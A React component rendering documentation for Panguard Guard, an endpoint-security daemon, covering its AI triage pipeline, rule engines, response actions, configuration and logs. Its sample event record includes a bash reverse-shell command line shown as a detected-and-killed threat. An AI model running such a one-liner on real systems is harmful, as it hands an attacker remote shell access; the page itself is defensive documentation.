'use client';

import { useState } from 'react';
import { Copy, Check, Shield, Brain, FileText, MessageSquare, Crosshair } from 'lucide-react';
import FadeInUp from '@/components/FadeInUp';
import SectionWrapper from '@/components/ui/SectionWrapper';
import { Link } from '@/navigation';

function CodeBlock({ code, title }: { code: string; title?: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <div className="relative bg-[#111] border border-border rounded-xl overflow-hidden">
      {title && (
        <div className="px-4 py-2 border-b border-border text-xs text-text-muted font-mono">
          {title}
        </div>
      )}
      <pre className="p-4 font-mono text-sm text-gray-300 overflow-x-auto whitespace-pre">
        {code}
      </pre>
      <button
        onClick={handleCopy}
        className="absolute top-3 right-3 p-1.5 rounded-md bg-surface-2/50 hover:bg-surface-2 transition-colors"
        aria-label="Copy"
      >
        {copied ? (
          <Check className="w-3.5 h-3.5 text-panguard-green" />
        ) : (
          <Copy className="w-3.5 h-3.5 text-text-muted" />
        )}
      </button>
    </div>
  );
}

export default function GuardDocsContent() {
  return (
    <SectionWrapper className="py-16 sm:py-24">
      <div className="max-w-3xl mx-auto">
        {/* Header */}
        <FadeInUp>
          <div className="flex items-center gap-2 text-xs uppercase tracking-[0.2em] text-panguard-green/70 font-semibold mb-4">
            <Link href="/docs" className="hover:text-panguard-green transition-colors">
              Docs
            </Link>
            <span>/</span>
            <span>Guard</span>
          </div>
          <h1 className="text-3xl sm:text-4xl lg:text-5xl font-bold text-text-primary">
            Panguard Guard
          </h1>
          <p className="text-lg text-text-secondary mt-4 max-w-2xl">
            Real-time endpoint protection powered by a 5-agent AI pipeline. Guard monitors
            processes, network traffic, and file system changes 24/7 using Sigma, YARA, and
            ATR rule engines backed by a three-layer AI analysis funnel.
          </p>
        </FadeInUp>

        {/* Quick Start */}
        <FadeInUp className="mt-12">
          <h2 className="text-2xl font-bold text-text-primary mb-6">Quick Start</h2>
          <div className="space-y-4">
            <CodeBlock
              title="Start Guard daemon"
              code="panguard guard start"
            />
            <CodeBlock
              title="Check Guard status"
              code="panguard guard status"
            />
            <CodeBlock
              title="Stop Guard daemon"
              code="panguard guard stop"
            />
          </div>
          <p className="text-sm text-text-secondary mt-4">
            By default, Guard starts in <code className="text-panguard-green">monitor</code> mode.
            It logs threats but does not take automated action until you switch
            to <code className="text-panguard-green">protect</code> mode.
          </p>
        </FadeInUp>

        {/* 5-Agent Pipeline */}
        <FadeInUp className="mt-16">
          <h2 className="text-2xl font-bold text-text-primary mb-6">5-Agent Pipeline</h2>
          <p className="text-text-secondary mb-6">
            Every event flows through five specialised agents in sequence. Each agent
            enriches the event context before passing it to the next.
          </p>
          <div className="overflow-x-auto">
            <table className="w-full text-sm border border-border rounded-xl overflow-hidden">
              <thead>
                <tr className="bg-surface-1 text-text-secondary">
                  <th className="px-4 py-3 text-left font-medium">Agent</th>
                  <th className="px-4 py-3 text-left font-medium">Role</th>
                  <th className="px-4 py-3 text-left font-medium">Description</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-border">
                <tr>
                  <td className="px-4 py-3 text-panguard-green font-medium flex items-center gap-2">
                    <Crosshair className="w-4 h-4" /> Detect
                  </td>
                  <td className="px-4 py-3 text-text-primary">Rule matching</td>
                  <td className="px-4 py-3 text-text-secondary">
                    Runs Sigma, YARA, and ATR rules against incoming telemetry. Produces raw alerts with severity and confidence scores.
                  </td>
                </tr>
                <tr>
                  <td className="px-4 py-3 text-panguard-green font-medium flex items-center gap-2">
                    <Brain className="w-4 h-4" /> Analyze
                  </td>
                  <td className="px-4 py-3 text-text-primary">AI triage</td>
                  <td className="px-4 py-3 text-text-secondary">
                    Escalates ambiguous alerts through the three-layer AI funnel. Adjusts confidence scores and adds contextual reasoning.
                  </td>
                </tr>
                <tr>
                  <td className="px-4 py-3 text-panguard-green font-medium flex items-center gap-2">
                    <Shield className="w-4 h-4" /> Respond
                  </td>
                  <td className="px-4 py-3 text-text-primary">Action execution</td>
                  <td className="px-4 py-3 text-text-secondary">
                    Selects and executes response actions based on confidence thresholds: auto-act, confirm, or notify.
                  </td>
                </tr>
                <tr>
                  <td className="px-4 py-3 text-panguard-green font-medium flex items-center gap-2">
                    <FileText className="w-4 h-4" /> Report
                  </td>
                  <td className="px-4 py-3 text-text-primary">Structured logging</td>
                  <td className="px-4 py-3 text-text-secondary">
                    Writes JSONL event records, generates daily summaries, and pushes notifications to configured channels.
                  </td>
                </tr>
                <tr>
                  <td className="px-4 py-3 text-panguard-green font-medium flex items-center gap-2">
                    <MessageSquare className="w-4 h-4" /> Chat
                  </td>
                  <td className="px-4 py-3 text-text-primary">Interactive query</td>
                  <td className="px-4 py-3 text-text-secondary">
                    Natural-language interface for investigating past events, tuning rules, and asking follow-up questions about alerts.
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </FadeInUp>

        {/* Detection Engines */}
        <FadeInUp className="mt-16">
          <h2 className="text-2xl font-bold text-text-primary mb-6">Detection Engines</h2>
          <p className="text-text-secondary mb-6">
            Guard ships with three rule engines. All rules are updated automatically via
            the Panguard rule feed.
          </p>
          <div className="overflow-x-auto">
            <table className="w-full text-sm border border-border rounded-xl overflow-hidden">
              <thead>
                <tr className="bg-surface-1 text-text-secondary">
                  <th className="px-4 py-3 text-left font-medium">Engine</th>
                  <th className="px-4 py-3 text-left font-medium">Rules</th>
                  <th className="px-4 py-3 text-left font-medium">Scope</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-border">
                <tr>
                  <td className="px-4 py-3 text-panguard-green font-medium">Sigma</td>
                  <td className="px-4 py-3 text-text-primary">3,155</td>
                  <td className="px-4 py-3 text-text-secondary">
                    Generic log-based detection. Covers process creation, network connections, registry changes, and system events.
                  </td>
                </tr>
                <tr>
                  <td className="px-4 py-3 text-panguard-green font-medium">YARA</td>
                  <td className="px-4 py-3 text-text-primary">5,895</td>
                  <td className="px-4 py-3 text-text-secondary">
                    Binary and file pattern matching. Detects malware families, packers, exploit kits, and suspicious file structures.
                  </td>
                </tr>
                <tr>
                  <td className="px-4 py-3 text-panguard-green font-medium">ATR</td>
                  <td className="px-4 py-3 text-text-primary">27</td>
                  <td className="px-4 py-3 text-text-secondary">
                    AI Agent Threat Rules. Purpose-built for prompt injection, tool poisoning, MCP server abuse, and credential exfiltration by autonomous agents.
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </FadeInUp>

        {/* Three-Layer AI Funnel */}
        <FadeInUp className="mt-16">
          <h2 className="text-2xl font-bold text-text-primary mb-6">Three-Layer AI Funnel</h2>
          <p className="text-text-secondary mb-6">
            Not every alert needs cloud-scale AI. The funnel resolves the vast majority of
            events locally, keeping latency low and costs predictable.
          </p>
          <div className="space-y-4">
            {[
              {
                layer: 'Layer 1: Rules',
                percent: '90%',
                latency: '< 50 ms',
                description: 'Sigma, YARA, and ATR engines resolve clear-cut matches. No AI involved.',
                color: 'border-green-500/30 bg-green-500/5',
              },
              {
                layer: 'Layer 2: Local AI (Ollama)',
                percent: '7%',
                latency: '~ 2 s',
                description: 'Ambiguous alerts are analysed by a local LLM running on-device via Ollama. No data leaves the machine.',
                color: 'border-yellow-500/30 bg-yellow-500/5',
              },
              {
                layer: 'Layer 3: Cloud AI',
                percent: '3%',
                latency: '~ 5 s',
                description: 'Complex, multi-signal events are escalated to cloud AI for deep reasoning and cross-tenant intelligence.',
                color: 'border-orange-500/30 bg-orange-500/5',
              },
            ].map((item) => (
              <div key={item.layer} className={`border rounded-xl p-5 ${item.color}`}>
                <div className="flex items-center justify-between mb-2">
                  <h4 className="text-sm font-semibold text-text-primary">{item.layer}</h4>
                  <div className="flex items-center gap-3 text-xs text-text-secondary">
                    <span>{item.percent} of events</span>
                    <span className="text-text-muted">|</span>
                    <span>{item.latency}</span>
                  </div>
                </div>
                <p className="text-xs text-text-secondary leading-relaxed">{item.description}</p>
              </div>
            ))}
          </div>
        </FadeInUp>

        {/* Response Actions */}
        <FadeInUp className="mt-16">
          <h2 className="text-2xl font-bold text-text-primary mb-6">Response Actions</h2>
          <p className="text-text-secondary mb-6">
            Guard supports six response actions. In <code className="text-panguard-green">protect</code> mode,
            the Respond agent selects actions automatically based on confidence thresholds.
          </p>
          <div className="overflow-x-auto">
            <table className="w-full text-sm border border-border rounded-xl overflow-hidden">
              <thead>
                <tr className="bg-surface-1 text-text-secondary">
                  <th className="px-4 py-3 text-left font-medium">Action</th>
                  <th className="px-4 py-3 text-left font-medium">Description</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-border">
                {[
                  ['block_ip', 'Add source IP to firewall deny list (iptables / pf).'],
                  ['kill_process', 'Terminate the offending process tree immediately.'],
                  ['quarantine_file', 'Move file to quarantine directory and strip execute permissions.'],
                  ['alert', 'Send notification via configured channels (Slack, email, webhook).'],
                  ['snapshot', 'Capture full process state, environment, and open file handles for forensics.'],
                  ['escalate', 'Forward event to SOC / human analyst for manual triage.'],
                ].map(([action, desc]) => (
                  <tr key={action}>
                    <td className="px-4 py-3 text-panguard-green font-mono font-medium">{action}</td>
                    <td className="px-4 py-3 text-text-secondary">{desc}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          <h3 className="text-lg font-semibold text-text-primary mt-8 mb-3">Confidence Thresholds</h3>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            {[
              { range: '> 90%', level: 'AUTO', color: 'bg-green-500/10 border-green-500/30 text-green-400', action: 'Execute action immediately' },
              { range: '70 - 90%', level: 'CONFIRM', color: 'bg-yellow-500/10 border-yellow-500/30 text-yellow-400', action: 'Prompt operator for approval' },
              { range: '< 70%', level: 'NOTIFY', color: 'bg-orange-500/10 border-orange-500/30 text-orange-400', action: 'Log and send alert only' },
            ].map((item) => (
              <div key={item.level} className={`border rounded-xl p-4 text-center ${item.color}`}>
                <div className="text-lg font-bold">{item.range}</div>
                <div className="text-xs font-semibold mt-1">{item.level}</div>
                <div className="text-xs mt-2 opacity-70">{item.action}</div>
              </div>
            ))}
          </div>
        </FadeInUp>

        {/* Configuration */}
        <FadeInUp className="mt-16">
          <h2 className="text-2xl font-bold text-text-primary mb-6">Configuration</h2>
          <p className="text-text-secondary mb-4">
            View and modify Guard configuration interactively:
          </p>
          <CodeBlock
            title="Open configuration editor"
            code="panguard guard config"
          />

          <h3 className="text-lg font-semibold text-text-primary mt-8 mb-3">Key Options</h3>
          <div className="overflow-x-auto">
            <table className="w-full text-sm border border-border rounded-xl overflow-hidden">
              <thead>
                <tr className="bg-surface-1 text-text-secondary">
                  <th className="px-4 py-3 text-left font-medium">Option</th>
                  <th className="px-4 py-3 text-left font-medium">Values</th>
                  <th className="px-4 py-3 text-left font-medium">Default</th>
                  <th className="px-4 py-3 text-left font-medium">Description</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-border">
                {[
                  ['mode', 'monitor | protect', 'monitor', 'Monitor logs only, or actively respond to threats.'],
                  ['auto_response', 'true | false', 'false', 'Enable automated response actions in protect mode.'],
                  ['notification.slack', 'webhook URL', '(none)', 'Slack incoming webhook for alert delivery.'],
                  ['notification.email', 'address', '(none)', 'Email address for critical alert notifications.'],
                  ['notification.webhook', 'URL', '(none)', 'Generic webhook endpoint for all events.'],
                  ['ai.local_model', 'model name', 'llama3.2:3b', 'Ollama model used for Layer 2 analysis.'],
                  ['ai.cloud_enabled', 'true | false', 'true', 'Allow Layer 3 cloud AI escalation.'],
                ].map(([option, values, def, desc]) => (
                  <tr key={option}>
                    <td className="px-4 py-3 text-panguard-green font-mono font-medium text-xs">{option}</td>
                    <td className="px-4 py-3 text-text-primary text-xs">{values}</td>
                    <td className="px-4 py-3 text-text-muted text-xs">{def}</td>
                    <td className="px-4 py-3 text-text-secondary text-xs">{desc}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          <div className="mt-4 space-y-4">
            <CodeBlock
              title="Switch to protect mode with auto-response"
              code={`panguard guard config set mode protect
panguard guard config set auto_response true`}
            />
            <CodeBlock
              title="Configure Slack notifications"
              code="panguard guard config set notification.slack https://hooks.slack.com/services/T.../B.../xxx"
            />
          </div>
        </FadeInUp>

        {/* Monitoring & Logs */}
        <FadeInUp className="mt-16">
          <h2 className="text-2xl font-bold text-text-primary mb-6">Monitoring and Logs</h2>
          <p className="text-text-secondary mb-4">
            Guard writes structured event logs in JSONL format. Each line is a
            self-contained JSON object with timestamp, severity, rule ID, and action taken.
          </p>
          <CodeBlock
            title="Default log location"
            code="~/.panguard-guard/events.jsonl"
          />

          <h3 className="text-lg font-semibold text-text-primary mt-8 mb-3">Verbose Output</h3>
          <p className="text-text-secondary mb-4">
            Use the <code className="text-panguard-green">--verbose</code> flag to stream
            events to stdout in real time:
          </p>
          <CodeBlock
            title="Start Guard with verbose logging"
            code="panguard guard start --verbose"
          />

          <h3 className="text-lg font-semibold text-text-primary mt-8 mb-3">Event Callback Format</h3>
          <p className="text-text-secondary mb-4">
            Each event record follows this structure:
          </p>
          <CodeBlock
            title="JSONL event record"
            code={`{
  "timestamp": "2026-03-08T14:32:01.442Z",
  "severity": "high",
  "rule_id": "sigma:proc_creation_suspicious_shell",
  "engine": "sigma",
  "layer": 1,
  "confidence": 0.94,
  "action": "kill_process",
  "action_status": "executed",
  "process": {
    "pid": 48291,
    "name": "bash",
    "cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
  },
  "host": "prod-web-03"
}`}
          />
        </FadeInUp>

        {/* System Service */}
        <FadeInUp className="mt-16">
          <h2 className="text-2xl font-bold text-text-primary mb-6">System Service</h2>
          <p className="text-text-secondary mb-4">
            Install Guard as a system service so it starts automatically on boot.
            On Linux this creates a systemd unit; on macOS it creates a launchd plist.
          </p>
          <div className="space-y-4">
            <CodeBlock
              title="Install as system service"
              code="panguard guard install"
            />
            <CodeBlock
              title="Uninstall system service"
              code="panguard guard uninstall"
            />
          </div>
          <p className="text-sm text-text-secondary mt-4">
            Both commands require root / administrator privileges. Guard will prompt for
            elevation if not already running as root.
          </p>
        </FadeInUp>

        {/* Telemetry */}
        <FadeInUp className="mt-16">
          <h2 className="text-2xl font-bold text-text-primary mb-6">Telemetry</h2>
          <p className="text-text-secondary mb-4">
            Guard collects anonymous usage telemetry to improve rule quality and false-positive
            rates. No file contents, process arguments, or personally identifiable information
            is ever transmitted.
          </p>
          <div className="space-y-4">
            <CodeBlock
              title="Disable telemetry"
              code="panguard guard start --no-telemetry"
            />
            <CodeBlock
              title="Inspect telemetry payload before upload"
              code="panguard guard --show-upload-data"
            />
          </div>
          <p className="text-sm text-text-secondary mt-4">
            Full details on data collection and retention are available in{' '}
            <Link href="/privacy" className="text-panguard-green hover:underline">
              PRIVACY.md
            </Link>.
          </p>
        </FadeInUp>

        {/* Platform Notes */}
        <FadeInUp className="mt-16">
          <h2 className="text-2xl font-bold text-text-primary mb-6">Platform Notes</h2>
          <div className="overflow-x-auto">
            <table className="w-full text-sm border border-border rounded-xl overflow-hidden">
              <thead>
                <tr className="bg-surface-1 text-text-secondary">
                  <th className="px-4 py-3 text-left font-medium">Feature</th>
                  <th className="px-4 py-3 text-left font-medium">Linux</th>
                  <th className="px-4 py-3 text-left font-medium">macOS</th>
                  <th className="px-4 py-3 text-left font-medium">Windows</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-border">
                {[
                  ['Core Guard daemon', 'Yes', 'Yes', 'Yes'],
                  ['Sigma / YARA / ATR', 'Yes', 'Yes', 'Yes'],
                  ['Falco (eBPF kernel events)', 'Yes', 'No', 'No'],
                  ['Suricata DPI (deep packet inspection)', 'Yes', 'No', 'No'],
                  ['systemd service', 'Yes', '--', '--'],
                  ['launchd service', '--', 'Yes', '--'],
                ].map(([feature, linux, macos, windows]) => (
                  <tr key={feature}>
                    <td className="px-4 py-3 text-text-primary font-medium">{feature}</td>
                    <td className="px-4 py-3 text-text-secondary">{linux}</td>
                    <td className="px-4 py-3 text-text-secondary">{macos}</td>
                    <td className="px-4 py-3 text-text-secondary">{windows}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
          <p className="text-sm text-text-secondary mt-4">
            For Falco and Suricata setup instructions, see the{' '}
            <Link href="/docs/advanced-setup" className="text-panguard-green hover:underline">
              Advanced Setup Guide
            </Link>.
          </p>
        </FadeInUp>

        {/* CTA */}
        <FadeInUp className="mt-16">
          <div className="bg-surface-1/50 border border-border rounded-2xl p-8 text-center">
            <h3 className="text-xl font-bold text-text-primary mb-3">Start Protecting</h3>
            <p className="text-text-secondary mb-6 max-w-lg mx-auto">
              Install Panguard and activate Guard in under a minute. Community plan
              includes full scan and Layer 1 rule-based protection at no cost.
            </p>
            <CodeBlock code="panguard guard start" />
            <div className="flex flex-wrap justify-center gap-3 mt-6">
              <Link
                href="/docs/getting-started"
                className="inline-flex items-center gap-2 bg-panguard-green text-white font-semibold rounded-full px-6 py-2.5 text-sm hover:bg-panguard-green-light transition-all"
              >
                Full Setup Guide
              </Link>
              <Link
                href="/pricing"
                className="inline-flex items-center gap-2 border border-border text-text-secondary hover:text-text-primary hover:border-panguard-green font-semibold rounded-full px-6 py-2.5 text-sm transition-all"
              >
                View Plans
              </Link>
            </div>
          </div>
        </FadeInUp>
      </div>
    </SectionWrapper>
  );
}
